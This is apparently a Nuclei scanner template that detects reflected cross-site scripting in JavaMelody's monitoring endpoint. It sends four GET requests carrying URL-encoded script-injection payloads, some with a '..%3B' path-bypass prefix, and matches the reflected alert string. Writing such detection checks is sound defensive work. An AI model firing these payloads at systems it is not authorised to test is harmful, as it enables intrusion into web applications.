id: java-melody-reflected-xss

info:
  name: JavaMelody Monitoring XSS
  author: kailashbohara
  severity: medium
  description: Reflected cross site scripting (XSS) in JavaMelody monitoring.
  reference:
    - https://github.com/javamelody/javamelody/pull/555
    - https://github.com/Hurdano/JavaMelody-XSS
  tags: xss,javamelody

requests:
  - method: GET
    path:
      - '{{BaseURL}}/monitoring?part=graph&graph=usedMemory%3C%2fscript%3E%3Cscript%3Ealert(31337.37)%3C/script%3E'
      - '{{BaseURL}}/..%3B/monitoring?part=graph&graph=usedMemory%3C%2fscript%3E%3Cscript%3Ealert(31337.37)%3C/script%3E'
      - '{{BaseURL}}/monitoring?action=clear_counter&counter=%3Cscript%3Ealert(31337.37)%3C/script%3E'
      - '{{BaseURL}}/..%3B/monitoring?action=clear_counter&counter=%3Cscript%3Ealert(31337.37)%3C/script%3E'

    matchers-condition: and
    matchers:
      - type: word
        words:
          - 'alert(31337.37)'
      - type: word
        words:
          - 'JavaMelody'
      - type: status
        status:
          - 200
